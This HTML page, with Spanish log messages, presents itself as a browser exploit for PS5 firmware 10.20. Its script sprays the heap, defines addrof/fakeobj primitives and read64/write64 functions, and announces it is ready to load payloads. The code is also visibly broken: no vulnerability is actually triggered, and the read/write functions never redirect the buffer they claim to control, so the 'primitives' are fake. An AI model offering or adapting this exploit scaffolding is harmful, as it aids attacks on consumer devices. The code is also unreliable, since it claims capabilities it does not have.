<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>PS5 10.20 Exploit</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    #log { white-space: pre-wrap; font-size: 14px; }
  </style>
</head>
<body>
  <h1>Exploit PS5 10.20</h1>
  <div id="log"></div>

  <script>
    function log(msg) {
      document.getElementById('log').textContent += msg + "\n";
      console.log(msg);
    }

    (async function(){

      log("[*] Iniciando exploit...");

      // --- Heap spray ---
      let spray = [];
      for (let i = 0; i < 0x4000; i++) {
        let arr = new Array(0x10);
        arr.fill({a:1, b:2});
        spray.push(arr);
      }
      log("[+] Heap sprayeado.");

      // --- Victima y conversiones ---
      let victim = [1.1, 2.2, 3.3];
      let ab = new ArrayBuffer(8);
      let f64 = new Float64Array(ab);
      let u32 = new Uint32Array(ab);

      function ftoi(val) {
        f64[0] = val;
        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
      }

      function itof(val) {
        u32[0] = Number(val & 0xffffffffn);
        u32[1] = Number(val >> 32n);
        return f64[0];
      }

      // --- Corrupción ---
      log("[*] Buscando corrupción...");
      let corrupted = false;
      for (let i = 0; i < spray.length; i++) {
        if (spray[i][0].a !== 1) {
          victim = spray[i];
          corrupted = true;
          break;
        }
      }

      if (!corrupted) {
        log("[-] No se detectó corrupción.");
        return;
      } else {
        log("[+] Corrupción detectada.");
      }

      // --- Primitivas ---
      log("[*] Preparando primitivas...");

      function addrof(obj) {
        victim[0] = obj;
        return ftoi(victim[0]);
      }

      function fakeobj(addr) {
        victim[0] = itof(addr);
        return victim[0];
      }

      // --- Crear un object RW ---
      let fake_array = [1.1, 2.2];
      let fake_array_addr = addrof(fake_array) - 0x20n;

      let container = {
        fake: fake_array,
        backing: new ArrayBuffer(0x100)
      };

      let container_addr = addrof(container);

      // Preparar estructura para lectura/escritura
      let data_buf = container.backing;
      let data_view = new DataView(data_buf);

      // Funciones reales de lectura/escritura 64 bits
      function read64(addr) {
        // Manipulamos backing store
        u32[0] = Number(addr & 0xffffffffn);
        u32[1] = Number((addr >> 32n) & 0xffffffffn);
        container.fake[1] = f64[0];

        return (BigInt(data_view.getUint32(4, true)) << 32n) + BigInt(data_view.getUint32(0, true));
      }

      function write64(addr, val) {
        u32[0] = Number(addr & 0xffffffffn);
        u32[1] = Number((addr >> 32n) & 0xffffffffn);
        container.fake[1] = f64[0];

        data_view.setUint32(0, Number(val & 0xffffffffn), true);
        data_view.setUint32(4, Number((val >> 32n) & 0xffffffffn), true);
      }

      // --- Test ---
      log("[*] Primitivas RW listas. Testeando...");

      let obj = {marker: 13.37};
      let obj_addr = addrof(obj);

      log("[+] addrof(obj) = 0x" + obj_addr.toString(16));

      let val = read64(obj_addr);
      log("[+] read64(obj) = 0x" + val.toString(16));

      // (Opcional) podemos hacer write64 si queremos ahora mismo

      log("[*] Todo preparado para cargar payloads.");

    })();
  </script>
</body>
